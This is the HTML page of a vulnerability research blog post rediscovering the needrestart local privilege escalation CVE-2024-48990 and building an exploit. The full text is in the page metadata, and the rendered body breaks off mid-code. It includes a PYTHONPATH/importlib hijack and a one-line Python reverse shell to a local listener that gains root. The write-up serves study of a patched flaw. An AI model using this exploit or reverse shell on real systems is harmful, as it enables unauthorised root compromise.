<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Rediscovering CVE-2024-48990 and Crafting My Own Exploit | Ally Petitt</title>
<meta name=keywords content="Vulnerability-Research,CVE"><meta name=description content="Introduction On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the needrestart binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these here, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root."><meta name=author content="Ally Petitt"><link rel=canonical href=https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://ally-petitt.com:443/assets/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ally-petitt.com:443/assets/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ally-petitt.com:443/assets/favicon-32x32.png><link rel=apple-touch-icon href=https://ally-petitt.com:443/assets/apple-touch-icon.png><link rel=mask-icon href=https://ally-petitt.com:443/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Rediscovering CVE-2024-48990 and Crafting My Own Exploit"><meta property="og:description" content="Introduction On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the needrestart binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these here, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root."><meta property="og:type" content="article"><meta property="og:url" content="https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-25T00:00:00+00:00"><meta property="article:modified_time" content="2024-11-25T00:00:00+00:00"><meta property="og:site_name" content="Ally Petitt"><meta name=twitter:card content="summary"><meta name=twitter:title content="Rediscovering CVE-2024-48990 and Crafting My Own Exploit"><meta name=twitter:description content="Introduction On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the needrestart binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these here, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ally-petitt.com:443/en/posts/"},{"@type":"ListItem","position":2,"name":"Rediscovering CVE-2024-48990 and Crafting My Own Exploit","item":"https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Rediscovering CVE-2024-48990 and Crafting My Own Exploit","name":"Rediscovering CVE-2024-48990 and Crafting My Own Exploit","description":"Introduction On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the needrestart binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these here, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.","keywords":["Vulnerability-Research","CVE"],"articleBody":" Introduction On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the needrestart binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these here, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.\nI have never used needrestart and I have very little familiarity with Perl, so I am going in blind. Let’s find an N-day!\nTL;DR: I was able to set PYTHONPATH to a location where I created a fake importlib implementation that triggered a reverse shell as root via library path hijacking. The exploit files can be found on my Github.\nBecoming Familiar with needrestart I will begin by cloning the needrestart repository and getting a high-level overview of what it does.\ngit clone https://github.com/liske/needrestart A glance at the README reveals the purpose of needrestart:\nneedrestart checks which daemons need to be restarted after library upgrades.\nIt seems that needrestart is invoked by package managers via hook scripts in /ex after library upgrades. Of course, package managers like apt are typically executed with root privileges, which makes needrestart a target for Local Privilege Escalation (LPE) vulnerabilities.\nI installed needrestart from the Ubuntu repositories to interact with it directly.\n$ sudo apt install needrestart $ needrestart --version needrestart 3.6 - Restart daemons after library updates. -- snip -- Since this is version 3.6 and the patch was introduced in version 3.8, this needrestart installation is vulnerable.\nTracking Down CVE-2024-48990 The description of this CVE is the following:\nQualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.\nAdditionally, a patch on the file perl/lib/NeedRestart/Interp/Python.pm is linked in the CVE references section with the commit message “interp: do not set PYTHONPATH environment variable to prevent a LPE”. These are very substantial hints.\nThe patched file is in the NeedRestart::Interp::Python module. This module was specified in the README as a part of the needrestart interpreter scanning feature, which searches for outdated source code files in Python, Ruby, Perl, and Java.\nPYTHONPATH explained According to the official Python documentation, PYTHONPATH defines the default search path for module files that are imported. In fact, I have used PYTHONPATH within CTF competitions to execute my own user-controlled Python code with executed privileges via library path hijacking.\nPYTHONPATH Assignment in needrestart Let’s look at how PYTHONPATH is being set within needrestart. I will checkout to a vulnerable version of the source code to look further.\ngit checkout tags/v3.6 I used the search functionality to locate where PYTHONPATH is being set within the files() subroutine.\nThe nr_parse_env() subroutine above is defined in perl/lib/NeedRestart/Utils.pm and reads the /proc//environ file of the Python process that it is checking and returns an array of the environment variables used by that process.\nsub nr_parse_env($) { my $pid = shift; my $fh; open($fh, '\u003c', \"/proc/$pid/environ\") || return (); # read environment variables from environ file local $/ = \"\\000\"; my @env = \u003c$fh\u003e; chomp(@env); close($fh); return map { (/^([^=]+)=(.*)$/ ? ($1, $2) : ()) } @env; } Scrolling to lines 202-207 of perl/lib/NeedRestart/Interp/Python.pm sheds some insight into the Python code that is executed after the PYTHONPATH environment variable is set.\n# get include path my ($pyread, $pywrite) = nr_fork_pipe2($self-\u003e{debug}, $ptable-\u003e{exec}, '-'); # Equivalent to `python -` on the CLI print $pywrite \"import sys\\nprint(sys.path)\\n\"; # This code is passed into Python's stdin close($pywrite); my ($path) = \u003c$pyread\u003e; close($pyread); At a high level, this is a breakdown of the most relevant steps from the code shared so far:\nThe files() subroutine of the Python interpreter checker is called with the PID of a Python process as the argument. The environment variables associated with that process are parsed. If a PYTHONPATH environment variable is found, $ENV is set to contain that value. A forked process of Python is being launched where the code import sys\\nprint(sys.path)\\n is being executed. The %ENV Variable As stated in the Perl documentation, “Perl maintains environment variables in a special hash named %ENV”.\nEven though %ENV is not explicitly passed as a parameter to the child Python process that is being created by needrestart, Perl will still carry over those values behind the scenes, which is why the value of %ENV is significant.\nSeed of an Attack Idea A potential attack strategy is forming: launch a Python process with the PYTHONPATH set to an attacker-controlled directory and perform a library path hijacking attack to execute arbitrary Python code.\nBefore we can create a proof-of-concept for this idea, however, we must first verify that we can do the following:\nTrigger the Python interpreter scan to check an attacker-controlled process. Identify a Python library that can be hijacked. The imported module sys is built-in to Python and does not rely on an external module path. Since Python does not search through external files in the search path for sys, we will have to be more creative with our approach. Triggering the Python Interpreter Check As previously mentioned, needrestart supports interpreter checks on Python, Ruby, Perl, and Java programs. These interpreter checks are iteratively invoked by the needrestart_interp_check() subroutine on a given process in perl/lib/NeedRestart.pm.\nsub needrestart_interp_check($$$$$) { my $debug = shift; my $pid = shift; -- snip -- foreach my $interp (values %Interps) { # iterate through Python, Ruby, Perl, and Java interpreter checkers if($interp-\u003eisa($pid, $bin)) { # check that argv[0] of the process is supported by the current interpreter checker -- snip -- my %files = $interp-\u003efiles($pid, \\%InterpCache); # call the vulnerable files() subroutine on the process -- snip -- } } In turn, needrestart_interp_check() is called in line 584 by the main /needrestart Perl script when $restart is false and interpscan is not disabled by the configuration.\nunless($restart || !$nrconf{interpscan}) { $restart++ if(needrestart_interp_check($nrconf{verbosity} \u003e 1, $pid, $exe, $nrconf{blacklist_interp}, $opt_t)); } Luckily, $nrconf{interpscan} is enabled by default.\nAnother factor to consider is the PID that is being passed to needrestart_interp_check() since that corresponds with the process that the PYTHONPATH environment variable is being read from. Searching for the value of $pid in /needrestart reveals that the program iterates through a list of PIDs stored in $ptable.\nmy $ptable = nr_ptable(); -- snip -- for my $pid (sort {$a \u003c=\u003e $b} keys %$ptable) { The $ptable hash is populated with a list of all process objects accessible to the user executing needrestart.\nmy %ptable; { local $SIG{__WARN__} = sub {}; %ptable = map {$_-\u003epid =\u003e $_} @{ new Proc::ProcessTable(enable_ttys =\u003e 1)-\u003etable }; } sub nr_ptable() { return \\%ptable; } This verifies that we will be able to invoke needrestart_interp_check() with the PID of our malicious process since all of the processes are iterated through.\nExploit Development Flushing out the Plan Since I couldn’t do library path hijacking with the built-in sys module, I thought about other options that I could target within the short Python snippet import sys\\nprint(sys.path) that is executed in Python.pm.\nThere are two other notable tokens aside from sys: print and import. I decided to read more about how import in the official documentation. In particular, this snippet from the docs stood out to me:\nimportlib.import_module() is provided to support applications that determine dynamically the modules to be loaded.\nIt seems that using the import statement in python can trigger the importlib module. I used the find command to verify that importlib is indeed a dynamically loaded library rather than a Python built-in like sys.\n$ find / -name importlib 2\u003e/dev/null /usr/lib/python3.12/importlib Maybe we can take advantage of importlib being dynamically loaded along with the fact that the contents of __init__.py are automatically executed when a module is loaded. I created a directory in /tmp/needrestart with the following structure:\n./importlib ./importlib/__init__.py ./main.py The contents of main.py are below.\n$ main.py import sys In ./importlib/__init__.py, I write Python code that will create a hacked.txt file:\n$ cat ./importlib/__init__.py import os os.system(\"touch hacked.txt\") Let’s put this idea to the test! I will export PYTHONPATH=/tmp/needrestart and manually replicate the python process that needrestart executes.\nIt works! Let’s see if we can port this attack directly to needrestart.\nLaunching the exploit I modified main.py to be an infinite loop so that it continues running while needrestart is searching the process list. The purpose of this file is to simply trigger the Python interpreter scan with our desired PYTHONPATH value.\n$ cat main.py while True: pass Let’s up the ante here and get a reverse shell as root.\n$ cat importlib/__init__.py import os,pty,socket;s=socket.socket();s.connect((\"127.0.0.1\",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\") I executed python3 ./main.py with our malicious PYTHONPATH variable.\n$ export PYTHONPATH=/tmp/needrestart $ python3 ./main.py In a separate terminal, I verified that our process was showing up and the desired PYTHONPATH variable was set in the way that needrestart would read it.\n$ ps ax | grep python3 428477 pts/13 R+ 0:03 python3 ./main.py $ cat /proc/428477/environ | grep --text -oP 'PYTHONPATH[^\\x00]*' # verify our environment variable shows up PYTHONPATH=/tmp/needrestart Note: Make sure that the python3 binary that you are running is located at a path that follows this regex pattern for needrestart to recognize it as a valid Python program: ^/usr/(local/)?bin/python([23][.\\d]*)?$.\nNow, I will test the exploit by setting up a nc listener and attempting to install curl using apt!\nIt worked! We have successfully identified and exploited the n-day, CVE-2024-48990. In a real-world environment, it is likely that a system administrator or cron job would periodically perform library upgrades on the vulnerable server through a package manager. The package manager, with elevated privileges, would launch needrestart, which ends up scanning our attacker-controlled process and ultimately executing our desired Python code as root.\nThanks for reading!\n","wordCount":"1630","inLanguage":"en","datePublished":"2024-11-25T00:00:00Z","dateModified":"2024-11-25T00:00:00Z","author":{"@type":"Person","name":"Ally Petitt"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/"},"publisher":{"@type":"Organization","name":"Ally Petitt","logo":{"@type":"ImageObject","url":"https://ally-petitt.com:443/assets/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ally-petitt.com:443/en/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ally-petitt.com:443/en/archives title=Archive><span>Archive</span></a></li><li><a href=https://ally-petitt.com:443/en/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://ally-petitt.com:443/en/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://ally-petitt.com:443/en/about-me/ title="About Me"><span>About Me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://ally-petitt.com:443/en/>Home</a>&nbsp;»&nbsp;<a href=https://ally-petitt.com:443/en/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Rediscovering CVE-2024-48990 and Crafting My Own Exploit</h1><div class=post-meta><span title='2024-11-25 00:00:00 +0000 UTC'>2024-11-25</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Ally Petitt</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#introduction aria-label=Introduction>Introduction</a><ul><li><a href=#becoming-familiar-with-needrestart aria-label="Becoming Familiar with needrestart">Becoming Familiar with needrestart</a></li></ul></li><li><a href=#tracking-down-cve-2024-48990 aria-label="Tracking Down CVE-2024-48990">Tracking Down CVE-2024-48990</a><ul><li><a href=#pythonpath-explained aria-label="PYTHONPATH explained">PYTHONPATH explained</a></li><li><a href=#pythonpath-assignment-in-needrestart aria-label="PYTHONPATH Assignment in needrestart">PYTHONPATH Assignment in needrestart</a><ul><li><a href=#the-env-variable aria-label="The %ENV Variable">The %ENV Variable</a></li><li><a href=#seed-of-an-attack-idea aria-label="Seed of an Attack Idea">Seed of an Attack Idea</a></li><li><a href=#triggering-the-python-interpreter-check aria-label="Triggering the Python Interpreter Check">Triggering the Python Interpreter Check</a></li></ul></li></ul></li><li><a href=#exploit-development aria-label="Exploit Development">Exploit Development</a><ul><li><a href=#flushing-out-the-plan aria-label="Flushing out the Plan">Flushing out the Plan</a></li><li><a href=#launching-the-exploit aria-label="Launching the exploit">Launching the exploit</a></li></ul></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=/images/ubuntu-logo.png alt="Ubuntu logo"></p><h1 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h1><p>On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the <code>needrestart</code> binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these <a href=https://www.qualys.com/2024/11/19/needrestart/needrestart.txt>here</a>, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.</p><p>I have never used <code>needrestart</code> and I have very little familiarity with Perl, so I am going in blind. Let&rsquo;s find an N-day!</p><p><strong>TL;DR</strong>: I was able to set PYTHONPATH to a location where I created a fake <code>importlib</code> implementation that triggered a reverse shell as root via library path hijacking. The exploit files can be found on my <a href=https://github.com/ally-petitt/CVE-2024-48990-Exploit>Github</a>.</p><h2 id=becoming-familiar-with-needrestart>Becoming Familiar with <code>needrestart</code><a hidden class=anchor aria-hidden=true href=#becoming-familiar-with-needrestart>#</a></h2><p>I will begin by cloning the <code>needrestart</code> repository and getting a high-level overview of what it does.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/liske/needrestart
</span></span></code></pre></div><p>A glance at the <a href=https://github.com/liske/needrestart/blob/master/README.md>README</a> reveals the purpose of <code>needrestart</code>:</p><blockquote><p><em>needrestart</em> checks which daemons need to be restarted after library upgrades.</p></blockquote><p>It seems that <code>needrestart</code> is invoked by package managers via hook scripts in <code>/ex</code> after library upgrades. Of course, package managers like <code>apt</code> are typically executed with root privileges, which makes <code>needrestart</code> a target for Local Privilege Escalation (LPE) vulnerabilities.</p><p>I installed <code>needrestart</code> from the Ubuntu repositories to interact with it directly.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo apt install needrestart
</span></span><span style=display:flex><span>$ needrestart --version
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>needrestart 3.6 - Restart daemons after library updates.
</span></span><span style=display:flex><span>-- snip --
</span></span></code></pre></div><p>Since this is version 3.6 and the patch was introduced in version 3.8, this <code>needrestart</code> installation is vulnerable.</p><h1 id=tracking-down-cve-2024-48990>Tracking Down CVE-2024-48990<a hidden class=anchor aria-hidden=true href=#tracking-down-cve-2024-48990>#</a></h1><p>The <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-48990>description</a> of this CVE is the following:</p><blockquote><p>Qualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.</p></blockquote><p>Additionally, a <a href=https://github.com/liske/needrestart/commit/fcc9a4401392231bef4ef5ed026a0d7a275149ab>patch</a> on the file <code>perl/lib/NeedRestart/Interp/Python.pm</code> is linked in the CVE references section with the commit message &ldquo;interp: do not set PYTHONPATH environment variable to prevent a LPE&rdquo;. These are very substantial hints.</p><p>The patched file is in the <code>NeedRestart::Interp::Python</code> module. This module was specified in the README as a part of the <code>needrestart</code> interpreter scanning feature, which searches for outdated source code files in Python, Ruby, Perl, and Java.</p><h2 id=pythonpath-explained>PYTHONPATH explained<a hidden class=anchor aria-hidden=true href=#pythonpath-explained>#</a></h2><p>According to the official <a href=https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH>Python documentation</a>, <code>PYTHONPATH</code> defines the default search path for module files that are imported. In fact, I have used PYTHONPATH within CTF competitions to execute my own user-controlled Python code with executed privileges via library path hijacking.</p><h2 id=pythonpath-assignment-in-needrestart>PYTHONPATH Assignment in <code>needrestart</code><a hidden class=anchor aria-hidden=true href=#pythonpath-assignment-in-needrestart>#</a></h2><p>Let&rsquo;s look at how <code>PYTHONPATH</code> is being set within <code>needrestart</code>. I will checkout to a vulnerable version of the source code to look further.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git checkout tags/v3.6
</span></span></code></pre></div><p>I used the search functionality to locate where <code>PYTHONPATH</code> is being set within the <code>files()</code> subroutine.</p><p><img loading=lazy src=/images/needrestart-pythonpath.png alt></p><p>The <code>nr_parse_env()</code> subroutine above is defined in <code>perl/lib/NeedRestart/Utils.pm</code> and reads the <code>/proc/&lt;pid>/environ</code> file of the Python process that it is checking and returns an array of the environment variables used by that process.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span><span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>nr_parse_env</span>($) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> $pid <span style=color:#f92672>=</span> shift;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> $fh;
</span></span><span style=display:flex><span>    open($fh, <span style=color:#e6db74>&#39;&lt;&#39;</span>, <span style=color:#e6db74>&#34;/proc/$pid/environ&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#66d9ef>return</span> (); <span style=color:#75715e># read environment variables from environ file</span>
</span></span><span style=display:flex><span>    local $/ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;\000&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> @env <span style=color:#f92672>=</span> <span style=color:#e6db74>&lt;$fh&gt;</span>;
</span></span><span style=display:flex><span>    chomp(@env);
</span></span><span style=display:flex><span>    close($fh);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> map { (<span style=color:#e6db74>/^([^=]+)=(.*)$/</span> ? ($1, $2) : ()) } @env;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Scrolling to lines 202-207 of <code>perl/lib/NeedRestart/Interp/Python.pm</code> sheds some insight into the Python code that is executed after the <code>PYTHONPATH</code> environment variable is set.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span>    <span style=color:#75715e># get include path</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> ($pyread, $pywrite) <span style=color:#f92672>=</span> nr_fork_pipe2($self<span style=color:#f92672>-&gt;</span>{debug}, $ptable<span style=color:#f92672>-&gt;</span>{exec}, <span style=color:#e6db74>&#39;-&#39;</span>); <span style=color:#75715e># Equivalent to `python -` on the CLI</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>print</span> $pywrite <span style=color:#e6db74>&#34;import sys\nprint(sys.path)\n&#34;</span>; <span style=color:#75715e># This code is passed into Python&#39;s stdin</span>
</span></span><span style=display:flex><span>    close($pywrite);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> ($path) <span style=color:#f92672>=</span> <span style=color:#e6db74>&lt;$pyread&gt;</span>;
</span></span><span style=display:flex><span>    close($pyread);
</span></span></code></pre></div><p>At a high level, this is a breakdown of the most relevant steps from the code shared so far:</p><ol><li>The <code>files()</code> subroutine of the Python interpreter checker is called with the PID of a Python process as the argument.</li><li>The environment variables associated with that process are parsed.<ul><li>If a <code>PYTHONPATH</code> environment variable is found, <code>$ENV</code> is set to contain that value.</li></ul></li><li>A forked process of Python is being launched where the code <code>import sys\nprint(sys.path)\n</code> is being executed.</li></ol><h3 id=the-env-variable>The <code>%ENV</code> Variable<a hidden class=anchor aria-hidden=true href=#the-env-variable>#</a></h3><p>As stated in the <a href=https://perldoc.perl.org/Env>Perl documentation</a>, &ldquo;Perl maintains environment variables in a special hash named %ENV&rdquo;.</p><p>Even though <code>%ENV</code> is not explicitly passed as a parameter to the child Python process that is being created by <code>needrestart</code>, Perl will still carry over those values behind the scenes, which is why the value of <code>%ENV</code> is significant.</p><h3 id=seed-of-an-attack-idea>Seed of an Attack Idea<a hidden class=anchor aria-hidden=true href=#seed-of-an-attack-idea>#</a></h3><p>A potential attack strategy is forming: launch a Python process with the <code>PYTHONPATH</code> set to an attacker-controlled directory and perform a library path hijacking attack to execute arbitrary Python code.</p><p>Before we can create a proof-of-concept for this idea, however, we must first verify that we can do the following:</p><ul><li>Trigger the Python interpreter scan to check an attacker-controlled process.</li><li>Identify a Python library that can be hijacked.<ul><li>The imported module <code>sys</code> is built-in to Python and does not rely on an external module path. Since Python does not search through external files in the search path for <code>sys</code>, we will have to be more creative with our approach.</li></ul></li></ul><h3 id=triggering-the-python-interpreter-check>Triggering the Python Interpreter Check<a hidden class=anchor aria-hidden=true href=#triggering-the-python-interpreter-check>#</a></h3><p>As <a href=/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/#tracking-down-cve-2024-48990>previously mentioned</a>, <code>needrestart</code> supports interpreter checks on Python, Ruby, Perl, and Java programs. These interpreter checks are iteratively invoked by the <code>needrestart_interp_check()</code> subroutine on a given process in <code>perl/lib/NeedRestart.pm</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span><span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>needrestart_interp_check</span>($$$$$) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> $debug <span style=color:#f92672>=</span> shift;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> $pid <span style=color:#f92672>=</span> shift;
</span></span><span style=display:flex><span>    <span style=color:#f92672>--</span> snip <span style=color:#f92672>--</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span> <span style=color:#66d9ef>my</span> $interp (values %Interps) { <span style=color:#75715e># iterate through Python, Ruby, Perl, and Java interpreter checkers</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($interp<span style=color:#f92672>-&gt;</span>isa($pid, $bin)) { <span style=color:#75715e># check that argv[0] of the process is supported by the current interpreter checker</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>--</span> snip <span style=color:#f92672>--</span>
</span></span><span style=display:flex><span>	    <span style=color:#66d9ef>my</span> %files <span style=color:#f92672>=</span> $interp<span style=color:#f92672>-&gt;</span>files($pid, <span style=color:#f92672>\</span>%InterpCache); <span style=color:#75715e># call the vulnerable files() subroutine on the process</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>--</span> snip <span style=color:#f92672>--</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>In turn, <code>needrestart_interp_check()</code> is called in line 584 by the main <code>/needrestart</code> Perl script when <code>$restart</code> is false and <code>interpscan</code> is not disabled by the configuration.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span>	<span style=color:#66d9ef>unless</span>($restart <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>$nrconf{interpscan}) {
</span></span><span style=display:flex><span>	    $restart<span style=color:#f92672>++</span> <span style=color:#66d9ef>if</span>(needrestart_interp_check($nrconf{verbosity} <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>, $pid, $exe, $nrconf{blacklist_interp}, $opt_t));
</span></span><span style=display:flex><span>	}
</span></span></code></pre></div><p>Luckily, <code>$nrconf{interpscan}</code> is enabled by default.</p><p><img loading=lazy src=/images/needrestart-nrconf.png alt="<code>$nrconf{interpscan}</code> being set to 0"></p><p>Another factor to consider is the PID that is being passed to <code>needrestart_interp_check()</code> since that corresponds with the process that the <code>PYTHONPATH</code> environment variable is being read from. Searching for the value of <code>$pid</code> in <code>/needrestart</code> reveals that the program iterates through a list of PIDs stored in <code>$ptable</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span>    <span style=color:#66d9ef>my</span> $ptable <span style=color:#f92672>=</span> nr_ptable();
</span></span><span style=display:flex><span>    <span style=color:#f92672>--</span> snip <span style=color:#f92672>--</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>my</span> $pid (sort {$a <span style=color:#e6db74>&lt;=&gt;</span> $b} keys %$ptable) {
</span></span></code></pre></div><p>The <code>$ptable</code> hash is populated with a list of all process objects accessible to the user executing <code>needrestart</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span><span style=color:#66d9ef>my</span> %ptable;
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    local $SIG{__WARN__} <span style=color:#f92672>=</span> <span style=color:#66d9ef>sub</span> {};
</span></span><span style=display:flex><span>    %ptable <span style=color:#f92672>=</span> map {$_<span style=color:#f92672>-&gt;</span>pid <span style=color:#f92672>=&gt;</span> $_} @{ <span style=color:#66d9ef>new</span> Proc::ProcessTable(enable_ttys <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>1</span>)<span style=color:#f92672>-&gt;</span>table };
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>nr_ptable</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>\</span>%ptable;
</span></span><span style=display:flex><span>}
